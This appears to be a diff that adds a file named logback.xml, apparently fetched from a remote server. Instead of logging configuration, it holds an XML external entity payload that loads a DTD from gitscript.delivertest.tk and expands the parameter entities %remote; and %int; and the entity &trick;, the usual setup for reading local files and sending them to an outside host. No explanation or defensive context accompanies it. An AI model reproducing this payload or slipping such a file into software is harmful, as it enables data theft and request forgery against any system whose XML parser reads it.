@@ -1,0 +1,4 @@
+# file logback.xml from the server gitscript.delivertest.tk:443
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "https://gitscript.delivertest.tk/1.dtd">%remote;%int;]>
+<a>&trick;</a>
